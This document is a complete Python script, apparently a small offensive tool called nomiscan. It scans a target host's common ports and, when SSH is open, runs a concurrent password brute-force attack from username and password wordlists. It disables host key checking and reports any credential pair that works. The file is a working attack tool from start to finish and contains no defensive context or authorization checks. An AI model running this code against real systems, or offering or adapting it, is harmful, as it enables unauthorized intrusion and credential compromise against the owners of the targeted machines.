import asyncio
import asyncssh
import socket
import sys

ports = {
    22: "SSH",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    443: "HTTPS",
    8080: "HTTP alternative",
    8443: "HTTPS alternative",
    20: "FTP data",
    21: "FTP control",
    23: "Telnet",
    3389: "Remote Desktop"
}

def scan_port(ip, port, timeout=1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            return result == 0
    except Exception as e:
        print(f"Error scanning port {port}: {e}")
        return False

async def try_ssh(target, username, password):
    try:
        async with asyncssh.connect(
            target,
            port=22,
            username=username,
            password=password,
            known_hosts=None,
            login_timeout=5
        ) as conn:
            print(f"SUCCESS: {username}:{password} works on {target}")
        return True
    except asyncssh.PermissionDenied:
        print(f"Denied: {username}:{password}")
        return False
    except asyncssh.ConnectionLost:
        print(f"Connection lost for {username}:{password}")
        return False
    except Exception as e:
        print(f"SSH connection error for {username}:{password}: {e}")
        return False

async def ssh_bruteforce(target, username_file, password_file):
    try:
        with open(username_file, "r") as uf:
            usernames = [line.strip() for line in uf if line.strip()]
    except Exception as e:
        print(f"Error reading usernames file: {e}")
        return

    try:
        with open(password_file, "r") as pf:
            passwords = [line.strip() for line in pf if line.strip()]
    except Exception as e:
        print(f"Error reading passwords file: {e}")
        return

    print(f"Starting async SSH brute force on {target} with {len(usernames)} usernames and {len(passwords)} passwords.")

    semaphore = asyncio.Semaphore(10)

    async def sem_task(username, password):
        async with semaphore:
            return await try_ssh(target, username, password)

    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append(asyncio.create_task(sem_task(username, password)))

    for task in asyncio.as_completed(tasks):
        result = await task
        if result:
            for t in tasks:
                if not t.done():
                    t.cancel()
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except Exception:
                pass
            return

    print("Brute force finished: no valid combination found.")

async def main_async(target):
    print(f"Scanning ports on {target}:")
    ssh_open = False
    for port, service in ports.items():
        if scan_port(target, port):
            print(f"Port {port} ({service}) is open.")
            if port == 22:
                ssh_open = True
        else:
            print(f"Port {port} ({service}) is closed.")

    if ssh_open:
        answer = input("Port 22 (SSH) is open. Do you want to start an SSH brute force attack (yes/no): ").strip().lower()
        if answer == "yes":
            username_file = input("Enter the path for the username list file: ").strip()
            password_file = input("Enter the path for the password list file: ").strip()
            await ssh_bruteforce(target, username_file, password_file)
        else:
            print("No SSH attack performed.")
    else:
        print("Port 22 (SSH) is not open. No SSH brute force attack can be performed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 nomiscan.py <ip_address_or_hostname>")
        sys.exit(1)
    target_input = sys.argv[1]
    try:
        target = socket.gethostbyname(target_input)
    except Exception as e:
        print(f"Error resolving target {target_input}: {e}")
        sys.exit(1)
    try:
        asyncio.run(main_async(target))
    except KeyboardInterrupt:
        print("Program interrupted by user.")
